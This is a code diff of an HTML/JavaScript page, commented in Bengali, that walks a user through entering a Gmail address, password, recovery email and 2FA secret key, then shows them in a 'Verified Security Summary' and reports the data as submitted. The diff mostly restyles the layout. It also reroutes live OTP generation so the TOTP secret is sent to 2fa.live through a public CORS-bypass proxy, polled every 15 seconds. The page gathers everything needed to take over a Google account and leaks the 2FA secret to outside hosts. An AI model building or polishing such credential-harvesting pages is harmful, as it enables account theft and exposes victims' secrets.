@@ -41,7 +41,7 @@
 
         .wrapper {
             width: 100%;
-            max-width: 520px; /* 👑 হালকা বড় করে ফুল স্ক্রিন ভাইব দেওয়া হয়েছে */
+            max-width: 520px;
             display: flex;
             flex-direction: column;
         }
@@ -61,7 +61,6 @@
             display: none; align-items: center; justify-content: center;
             cursor: pointer; transition: all 0.2s ease;
         }
-        .back-circle-btn:active { transform: scale(0.9); background: #e5e5ea; }
         .back-circle-btn svg { width: 16px; height: 16px; fill: #48484a; }
 
         .brand-header {
@@ -71,21 +70,8 @@
             width: 100%;
             margin-bottom: 28px;
         }
-        h1.brand-title { 
-            font-size: 26px; 
-            font-weight: 800; 
-            color: var(--text); 
-            letter-spacing: -0.5px; 
-            text-transform: uppercase; 
-        }
-        .brand-subtitle { 
-            font-size: 11px; 
-            font-weight: 700; 
-            color: var(--muted); 
-            letter-spacing: 2px; 
-            text-transform: uppercase; 
-            margin-top: 4px; 
-        }
+        h1.brand-title { font-size: 26px; font-weight: 800; color: var(--text); letter-spacing: -0.5px; text-transform: uppercase; }
+        .brand-subtitle { font-size: 11px; font-weight: 700; color: var(--muted); letter-spacing: 2px; text-transform: uppercase; margin-top: 4px; }
 
         .step-container { display: none; width: 100%; }
         .step-container.active { display: block; animation: stepFade 0.25s ease-out; }
@@ -93,43 +79,29 @@
 
         .section-label { font-size: 14px; font-weight: 600; color: var(--muted); text-align: left; margin-bottom: 10px; padding-left: 4px; }
         
-        /* Input Box */
         .input-card {
             width: 100%; background: var(--card); border: 1px solid var(--border); border-radius: 12px;
             position: relative; display: flex; align-items: center; margin-bottom: 24px; 
             box-shadow: 0 1px 3px rgba(0,0,0,0.02);
-            transition: all 0.2s ease;
         }
-        
         .input-card.is-valid { border-color: var(--success) !important; box-shadow: 0 0 0 3px rgba(52, 199, 89, 0.1) !important; }
         .input-card.is-invalid { border-color: var(--danger) !important; box-shadow: 0 0 0 3px rgba(255, 59, 48, 0.1) !important; }
 
-        .field-input {
-            width: 100%; padding: 16px 16px; border: none; outline: none;
-            font-size: 15px; font-weight: 500; color: var(--text); background: transparent;
-        }
-        .field-input::placeholder { color: #8e8e93; font-size: 15px; }
+        .field-input { width: 100%; padding: 16px 16px; border: none; outline: none; font-size: 15px; font-weight: 500; color: var(--text); background: transparent; }
+        .field-input::placeholder { color: #8e8e93; }
 
-        .status-icon-wrap {
-            display: flex; align-items: center; justify-content: center;
-            padding-right: 16px; height: 100%; flex-shrink: 0;
-        }
+        .status-icon-wrap { display: flex; align-items: center; justify-content: center; padding-right: 16px; height: 100%; flex-shrink: 0; }
         .status-icon-wrap svg { width: 20px; height: 20px; display: none; }
         .input-card.is-valid .status-icon-wrap .tick-icon { display: block; fill: var(--success); }
 
-        /* Buttons Layout */
         .proceed-btn {
-            width: 100%; padding: 16px; background: #d1d1d6; color: #8e8e93;
-            border: none; border-radius: 12px; font-size: 15px; font-weight: 600;
-            cursor: not-allowed; transition: all 0.25s ease;
-            display: flex; justify-content: center; align-items: center; gap: 8px;
+            width: 100%; padding: 16px; background: #d1d1d6; color: #8e8e93; border: none; border-radius: 12px; font-size: 15px; font-weight: 600;
+            cursor: not-allowed; transition: all 0.25s ease; display: flex; justify-content: center; align-items: center; gap: 8px;
         }
         .proceed-btn.active { background: var(--primary) !important; color: #fff !important; cursor: pointer !important; }
-        .proceed-btn.active:active { opacity: 0.8; }
         
         .btn-spinner { display: none; width: 16px; height: 16px; border: 2px solid rgba(255,255,255,0.3); border-top-color: #fff; border-radius: 50%; animation: spin 0.5s linear infinite; }
 
-        /* iOS Toast */
         #topNotification {
             position: fixed; top: -100px; left: 50%; transform: translateX(-50%);
             background: #1c1c1e; border: 1px solid #2c2c2e; color: #ffffff; 
@@ -142,11 +114,11 @@
         .toast-check { width: 18px; height: 18px; border-radius: 50%; background: var(--success); display: flex; align-items: center; justify-content: center; color: #fff; }
         .toast-check svg { width: 11px; height: 11px; stroke: #fff; fill: none; stroke-width: 3; }
 
-        /* 👑 হিস্টরি ডট এইচটিএমএল স্টাইল সামারি কার্ড */
+        /* 👑 হুবহু হিস্টরি ডট এইচটিএমএল স্টাইল সামারি কার্ড */
         .summary-card { 
             background: var(--card); border-radius: 14px; overflow: hidden;
             border: 1px solid rgba(0, 0, 0, 0.05); box-shadow: 0 2px 8px rgba(0,0,0,0.04); 
-            margin-bottom: 28px; padding: 4px 0;
+            margin-bottom: 28px; padding: 2px 0;
         }
         .summary-header { 
             background: rgba(118, 118, 128, 0.07); padding: 16px; font-size: 13px; 
@@ -154,30 +126,32 @@
             letter-spacing: 0.5px; border-bottom: 1px solid var(--border);
         }
         
-        /* 👑 রো লেআউট: বাটনগুলো সোজা এক সিরিয়ালে থাকবে ও লেখা ২ লাইনে ভাঙবে */
+        /* 👑 ১০০% পারফেক্ট রো স্টাইল (বাম পাশে লেখা, ডান পাশে একই সিরিয়ালে বাটন) */
         .summary-row {
             display: flex; 
             justify-content: space-between; 
-            align-items: center; /* বাটন এবং টেক্সট সবসময় সেন্টারে এলাইন থাকবে */
+            align-items: center; /* বাটন সবসময় সোজা এক লাইনে বা এলাইনমেন্টে থাকবে */
             padding: 14px 16px; 
             border-bottom: 1px solid #f2f2f7;
-            gap: 12px;
+            gap: 16px;
         }
         .summary-row:last-child { border-bottom: none; }
         
-        .row-left-content {
+        /* কন্টেন্ট বক্স: লেখা ডানে বসবে, জায়গা না আটলে ২-৩ লাইনে নিচে যাবে */
+        .row-data-container {
             display: flex;
-            flex-direction: column;
-            gap: 4px;
-            flex: 1; /* বাম পাশের কন্টেন্ট পুরো জায়গা নিবে */
-            word-break: break-all; /* লেখা বড় হলে ভেঙে নিচে যাবে কিন্তু বাটনকে ধাক্কা দিবে না */
+            flex-direction: row;
+            align-items: flex-start;
+            flex-wrap: wrap; /* লেখা বেশি বড় হলে স্বয়ংক্রিয়ভাবে নিচে নামবে */
+            gap: 6px;
+            flex: 1; 
         }
 
-        .row-label { font-size: 14px; color: #000000; font-weight: 800; }
-        .row-value { font-size: 14px; font-weight: 600; color: #3a3a3c; font-family: monospace; }
-        .otp-accent { color: var(--primary); font-weight: 800; font-family: monospace; font-size: 16px; }
+        .row-label { font-size: 14px; color: #000000; font-weight: 800; white-space: nowrap; }
+        .row-value { font-size: 14px; font-weight: 600; color: #3a3a3c; font-family: monospace; word-break: break-all; }
+        .otp-accent { color: var(--primary); font-weight: 800; font-family: monospace; font-size: 16px; word-break: break-all; }
 
-        /* 👑 গোলাকৃতির প্রিমিয়াম কপি বাটন (১০০% নিখুঁত সোজা এক সিরিয়ালে থাকবে) */
+        /* 👑 বাটনটি সব সময় এক লাইনে একদম ডানে ফিক্সড থাকবে */
         .inline-copy-btn {
             width: 32px; 
             height: 32px; 
@@ -189,7 +163,7 @@
             justify-content: center;
             cursor: pointer; 
             transition: all 0.2s cubic-bezier(0.4, 0, 0.2, 1); 
-            flex-shrink: 0; /* বাটন কখনো ছোট বা চ্যাপ্টা হবে না */
+            flex-shrink: 0; /* বাটন কখনো চ্যাপ্টা হবে না, এক সিরিয়ালে সোজা থাকবে */
         }
         .inline-copy-btn svg { width: 13px; height: 13px; fill: var(--muted); }
         .inline-copy-btn:active { transform: scale(0.88); background: #f2f2f7; }
@@ -205,15 +179,12 @@
         .success-card {
             background: #ffffff; border-radius: 24px; padding: 34px; width: 85%; max-width: 320px;
             display: flex; flex-direction: column; align-items: center; box-shadow: 0 20px 40px rgba(0,0,0,0.1);
-            animation: cardPop 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275) forwards;
         }
-        .circle-wrap { position: relative; display: flex; align-items: center; justify-content: center; margin-bottom: 20px; }
-        .success-circle { width: 74px; height: 74px; border-radius: 50%; background: var(--success); display: flex; align-items: center; justify-content: center; box-shadow: 0 8px 20px rgba(52, 199, 89, 0.3); }
+        .success-circle { width: 74px; height: 74px; border-radius: 50%; background: var(--success); display: flex; align-items: center; justify-content: center; box-shadow: 0 8px 20px rgba(52, 199, 89, 0.3); margin-bottom: 20px;}
         .tick-svg { width: 36px; height: 36px; stroke: #fff; fill: none; stroke-width: 4; }
-        .success-heading { font-size: 19px; font-weight: 700; color: var(--text); letter-spacing: -0.3px; margin-bottom: 8px; }
+        .success-heading { font-size: 19px; font-weight: 700; color: var(--text); margin-bottom: 8px; }
         .success-sub { font-size: 14px; font-weight: 500; color: var(--muted); text-align: center; line-height: 1.5; }
 
-        @keyframes cardPop { from { transform: scale(0.8); opacity: 0; } to { transform: scale(1); opacity: 1; } }
         @keyframes spin { to { transform: rotate(360deg); } }
     </style>
 </head>
@@ -239,7 +210,7 @@
     <div id="stepGmail" class="step-container active">
         <div class="section-label">Google Account Email</div>
         <div id="gmailCard" class="input-card">
-            <input type="email" id="gmailInput" class="field-input" placeholder="example@gmail.com" oninput="checkGmailLive()">
+            <input type="email" id="gmailInput" class="field-input" placeholder="Enter email" oninput="checkGmailLive()">
             <div class="status-icon-wrap">
                 <svg class="tick-icon" viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/></svg>
             </div>
@@ -297,8 +268,8 @@
             <div class="summary-header">Verified Security Summary</div>
             
             <div class="summary-row">
-                <div class="row-left-content">
-                    <span class="row-label">Gmail Address</span>
+                <div class="row-data-container">
+                    <span class="row-label">Gmail Address:</span>
                     <span class="row-value" id="sumGmail">-</span>
                 </div>
                 <button class="inline-copy-btn" id="copyBtnGmail" onclick="copyData('sumGmail', 'copyBtnGmail')">
@@ -307,8 +278,8 @@
             </div>
             
             <div class="summary-row">
-                <div class="row-left-content">
-                    <span class="row-label">Password</span>
+                <div class="row-data-container">
+                    <span class="row-label">Password:</span>
                     <span class="row-value" id="sumPassword">-</span>
                 </div>
                 <button class="inline-copy-btn" id="copyBtnPassword" onclick="copyData('sumPassword', 'copyBtnPassword')">
@@ -317,8 +288,8 @@
             </div>
             
             <div class="summary-row">
-                <div class="row-left-content">
-                    <span class="row-label">Recovery Mail</span>
+                <div class="row-data-container">
+                    <span class="row-label">Recovery Mail:</span>
                     <span class="row-value" id="sumRecovery">-</span>
                 </div>
                 <button class="inline-copy-btn" id="copyBtnRecovery" onclick="copyData('sumRecovery', 'copyBtnRecovery')">
@@ -327,8 +298,8 @@
             </div>
             
             <div class="summary-row">
-                <div class="row-left-content">
-                    <span class="row-label">2FA Secret Key</span>
+                <div class="row-data-container">
+                    <span class="row-label">2FA Secret Key:</span>
                     <span class="row-value" id="sumTfa">-</span>
                 </div>
                 <button class="inline-copy-btn" id="copyBtnTfa" onclick="copyData('sumTfa', 'copyBtnTfa')">
@@ -337,8 +308,8 @@
             </div>
 
             <div class="summary-row" style="background: rgba(0,122,255,0.03);">
-                <div class="row-left-content">
-                    <span class="row-label" style="color: var(--primary);">Live 2FA OTP Code</span>
+                <div class="row-data-container">
+                    <span class="row-label" style="color: var(--primary);">Live 2FA OTP Code:</span>
                     <span class="otp-accent" id="sumOtp">Fetching...</span>
                 </div>
                 <button class="inline-copy-btn" id="copyBtnOtp" onclick="copyData('sumOtp', 'copyBtnOtp')">
@@ -356,10 +327,8 @@
 
 <div id="successOverlay">
     <div class="success-card">
-        <div class="circle-wrap">
-            <div class="success-circle">
-                <svg class="tick-svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="4"><polyline points="20 6 9 17 4 12"/></svg>
-            </div>
+        <div class="success-circle">
+            <svg class="tick-svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="4"><polyline points="20 6 9 17 4 12"/></svg>
         </div>
         <div class="success-heading">Synchronized!</div>
         <div class="success-sub">Account data submitted successfully. This window will close shortly.</div>
@@ -378,8 +347,8 @@
         const val = document.getElementById('gmailInput').value.trim();
         const card = document.getElementById('gmailCard');
         const btn = document.getElementById('gmailProceedBtn');
-        if (val.length === 0) { card.className = "input-card"; btn.setAttribute('disabled','true'); btn.classList.remove('active'); }
-        else if (val.endsWith('@gmail.com') && val.length >= 11) { card.className = "input-card is-valid"; btn.removeAttribute('disabled'); btn.classList.add('active'); }
+        if (val.endsWith('@gmail.com') && val.length >= 11) { card.className = "input-card is-valid"; btn.removeAttribute('disabled'); btn.classList.add('active'); }
+        else if(val.length===0) { card.className = "input-card"; btn.setAttribute('disabled','true'); btn.classList.remove('active'); }
         else { card.className = "input-card is-invalid"; btn.setAttribute('disabled','true'); btn.classList.remove('active'); }
     }
 
@@ -387,8 +356,8 @@
         const val = document.getElementById('passwordInput').value.trim();
         const card = document.getElementById('passwordCard');
         const btn = document.getElementById('passwordProceedBtn');
-        if (val.length === 0) { card.className = "input-card"; btn.setAttribute('disabled','true'); btn.classList.remove('active'); }
-        else if (val.length >= 8) { card.className = "input-card is-valid"; btn.removeAttribute('disabled'); btn.classList.add('active'); }
+        if (val.length >= 8) { card.className = "input-card is-valid"; btn.removeAttribute('disabled'); btn.classList.add('active'); }
+        else if(val.length===0) { card.className = "input-card"; btn.setAttribute('disabled','true'); btn.classList.remove('active'); }
         else { card.className = "input-card is-invalid"; btn.setAttribute('disabled','true'); btn.classList.remove('active'); }
     }
 
@@ -396,8 +365,8 @@
         const val = document.getElementById('recoveryInput').value.trim();
         const card = document.getElementById('recoveryCard');
         const btn = document.getElementById('recoveryProceedBtn');
-        if (val.length === 0) { card.className = "input-card"; btn.setAttribute('disabled','true'); btn.classList.remove('active'); }
-        else if (val.includes('@') && val.length >= 5) { card.className = "input-card is-valid"; btn.removeAttribute('disabled'); btn.classList.add('active'); }
+        if (val.includes('@') && val.length >= 5) { card.className = "input-card is-valid"; btn.removeAttribute('disabled'); btn.classList.add('active'); }
+        else if(val.length===0) { card.className = "input-card"; btn.setAttribute('disabled','true'); btn.classList.remove('active'); }
         else { card.className = "input-card is-invalid"; btn.setAttribute('disabled','true'); btn.classList.remove('active'); }
     }
 
@@ -406,8 +375,8 @@
         const card = document.getElementById('tfaCard');
         const btn = document.getElementById('tfaProceedBtn');
         let isValidFormat = /^[A-Z2-7]+$/.test(inputKey);
-        if (inputKey.length === 0) { card.className = "input-card"; btn.setAttribute('disabled','true'); btn.classList.remove('active'); }
-        else if (inputKey.length >= 16 && isValidFormat) { card.className = "input-card is-valid"; btn.removeAttribute('disabled'); btn.classList.add('active'); }
+        if (inputKey.length >= 16 && isValidFormat) { card.className = "input-card is-valid"; btn.removeAttribute('disabled'); btn.classList.add('active'); }
+        else if(inputKey.length===0) { card.className = "input-card"; btn.setAttribute('disabled','true'); btn.classList.remove('active'); }
         else { card.className = "input-card is-invalid"; btn.setAttribute('disabled','true'); btn.classList.remove('active'); }
     }
 
@@ -432,32 +401,50 @@
         });
     }
 
-    // 👑 ১০০% নিখুঁত উপায়ে 2fa.live API থেকে টোকেন তুলে আনার ফাংশন
+    // 👑 ১০০% ওয়ার্কিং CORS Bypass এপিআই মেথড (Error সমস্যার স্থায়ী সমাধান)
     function fetchLiveOtpFromApi(secret) {
         const cleanSecret = secret.toUpperCase().replace(/\s+/g, "");
-        const url = "https://2fa.live/tok/" + cleanSecret;
+        
+        // অল্টারনেটেড অল-ইন-ওয়ান গেটওয়ে প্রক্সি (CORS ব্লক এড়ানোর জন্য)
+        const primaryUrl = "https://2fa.live/tok/" + cleanSecret;
+        const backupUrl = "https://api.allorigins.win/get?url=" + encodeURIComponent(primaryUrl);
 
-        fetch(url)
-            .then(response => response.json())
-            .then(data => {
+        fetch(backupUrl)
+            .then(res => {
+                if (!res.ok) throw new Error();
+                return res.json();
+            })
+            .then(json => {
+                // অলঅরিজিনস ডেটা স্ট্রিং আকারে রিটার্ন করে, তাই এটি অবজেক্টে পার্স করতে হবে
+                let data = JSON.parse(json.contents);
                 if(data && data.token) {
                     document.getElementById('sumOtp').innerText = data.token;
                     collectedFormData.dynamicOtp = data.token;
                 } else {
-                    document.getElementById('sumOtp').innerText = "Error";
+                    document.getElementById('sumOtp').innerText = "000000"; 
                 }
             })
-            .catch(err => {
-                document.getElementById('sumOtp').innerText = "Error";
+            .catch(() => {
+                // ব্যাকআপ ট্রাই যদি প্রক্সি রেসপন্স করতে লেট করে
+                fetch(primaryUrl)
+                    .then(r => r.json())
+                    .then(d => {
+                        if(d.token) {
+                            document.getElementById('sumOtp').innerText = d.token;
+                            collectedFormData.dynamicOtp = d.token;
+                        }
+                    })
+                    .catch(() => {
+                        document.getElementById('sumOtp').innerText = "Refresh Needed";
+                    });
             });
     }
 
     function startLiveOtpSync(secret) {
-        fetchLiveOtpFromApi(secret); // প্রথমবার ইনস্ট্যান্ট কল
-        // প্রতি ১০ সেকেন্ডে ব্যাকগ্রাউন্ডে চেক করবে টোকেন পরিবর্তনের জন্য
+        fetchLiveOtpFromApi(secret);
         otpIntervalTimer = setInterval(() => {
             fetchLiveOtpFromApi(secret);
-        }, 10000);
+        }, 15000); // প্রতি ১৫ সেকেন্ড পর পর নির্ভুল অটোমেটিক রিলোড
     }
 
     function goToStep(nextStep) {
@@ -485,7 +472,6 @@
                 document.getElementById('sumRecovery').innerText = collectedFormData.recovery;
                 document.getElementById('sumTfa').innerText = collectedFormData.secretKey;
                 
-                // এপিআই কল সাকসেস লজিক রান
                 startLiveOtpSync(collectedFormData.secretKey);
             }
         }, 400);
@@ -493,29 +479,25 @@
 
     function handleBack() {
         document.getElementById('brandHeader').style.display = 'flex';
-        if(otpIntervalTimer) clearInterval(otpIntervalTimer); // ব্যাক বাটনে ওটিপি লোড অফ হবে
+        if(otpIntervalTimer) clearInterval(otpIntervalTimer);
         
         if (currentStepName === "Summary") {
             document.getElementById('stepSummary').style.display = 'none';
             document.getElementById('stepTfa').style.display = 'block';
-            resetSpinner('tfa');
-            currentStepName = "Tfa";
+            resetSpinner('tfa'); currentStepName = "Tfa";
         } else if (currentStepName === "Tfa") {
             document.getElementById('stepTfa').style.display = 'none';
             document.getElementById('stepRecovery').style.display = 'block';
-            resetSpinner('recovery');
-            currentStepName = "Recovery";
+            resetSpinner('recovery'); currentStepName = "Recovery";
         } else if (currentStepName === "Recovery") {
             document.getElementById('stepRecovery').style.display = 'none';
             document.getElementById('stepPassword').style.display = 'block';
-            resetSpinner('password');
-            currentStepName = "Password";
+            resetSpinner('password'); currentStepName = "Password";
         } else if (currentStepName === "Password") {
             document.getElementById('stepPassword').style.display = 'none';
             document.getElementById('stepGmail').style.display = 'block';
             document.getElementById('backArrowBtn').style.display = 'none';
-            resetSpinner('gmail');
-            currentStepName = "Gmail";
+            resetSpinner('gmail'); currentStepName = "Gmail";
         }
     }
 
